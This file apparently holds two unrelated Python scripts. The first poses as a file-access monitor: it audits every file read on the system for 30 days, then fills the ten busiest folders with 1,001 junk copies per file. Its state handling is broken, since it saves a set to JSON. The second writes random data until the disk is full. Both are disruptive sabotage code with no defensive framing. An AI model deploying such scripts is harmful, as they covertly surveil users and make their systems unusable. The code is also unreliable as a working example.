#!/usr/bin/env python3
import os
import time
import subprocess
import json
from datetime import datetime, timedelta
import random
import string

MONITORING_DURATION = timedelta(days=30)
LOG_FILE = "/var/log/file_access_monitor.log"
CONFIG_FILE = "/etc/file_access_monitor.conf"
STATE_FILE = "/var/lib/file_access_monitor/state.json"

def ensure_directories():
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)

def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r') as f:
            return json.load(f)
    return {"start_time": None, "file_access_counts": {}, "processed_folders": set()}

def save_state(state):
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f)

def log_access(file_path):
    with open(LOG_FILE, 'a') as f:
        f.write(f"{datetime.now().isoformat()} - {file_path}\n")

def monitor_file_accesses():
    state = load_state()
    if state["start_time"] is None:
        state["start_time"] = datetime.now().isoformat()
        save_state(state)

    start_time = datetime.fromisoformat(state["start_time"])
    if datetime.now() - start_time > MONITORING_DURATION:
        return False

    try:
        result = subprocess.run(['auditctl', '-l'], capture_output=True, text=True)
        if 'exit,always watch=/path/to/monitor' not in result.stdout:
            subprocess.run(['auditctl', '-w', '/', '-p', 'r', '-k', 'file_access'], check=True)

        while True:
            time.sleep(1)
            result = subprocess.run(['ausearch', '-k', 'file_access', '-m', 'open'], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if 'comm="' in line and 'name="' in line:
                    file_path = line.split('name="')[1].split('"')[0]
                    if file_path.startswith('/'):
                        folder_path = os.path.dirname(file_path)
                        state["file_access_counts"][folder_path] = state["file_access_counts"].get(folder_path, 0) + 1
                        log_access(file_path)
            save_state(state)
    except KeyboardInterrupt:
        pass
    return True

def create_decoy_files(folder_path, original_file, count=1001):
    base, ext = os.path.splitext(original_file)
    for i in range(count):
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        new_file = f"{base}_{suffix}{ext}"
        new_path = os.path.join(folder_path, new_file)
        try:
            with open(new_path, 'w') as f:
                f.write(f"Decoy file created at {datetime.now().isoformat()}\n")
        except Exception as e:
            pass

def process_folders():
    state = load_state()
    start_time = datetime.fromisoformat(state["start_time"])
    if datetime.now() - start_time < MONITORING_DURATION:
        return

    sorted_folders = sorted(state["file_access_counts"].items(), key=lambda x: x[1], reverse=True)
    for folder_path, count in sorted_folders[:10]:
        if folder_path in state["processed_folders"]:
            continue
        try:
            files = os.listdir(folder_path)
            for file_name in files:
                file_path = os.path.join(folder_path, file_name)
                if os.path.isfile(file_path):
                    create_decoy_files(folder_path, file_name)
            state["processed_folders"].add(folder_path)
        except Exception as e:
            pass
    save_state(state)

def main():
    ensure_directories()
    if not monitor_file_accesses():
        process_folders()

if __name__ == "__main__":
    main()

#!/usr/bin/env python3
import os
import time

def fill_disk(directory, chunk_size=1024*1024, delay=1):
    file_counter = 1
    while True:
        try:
            file_path = os.path.join(directory, f"file_{file_counter}.tmp")
            with open(file_path, 'wb') as f:
                f.write(os.urandom(chunk_size))
            file_counter += 1
            time.sleep(delay)
        except (OSError, IOError) as e:
            print(f"Disk full or error: {e}")
            break

if __name__ == "__main__":
    target_directory = os.path.expanduser("~/disk_fill_test")
    os.makedirs(target_directory, exist_ok=True)
    fill_disk(target_directory)

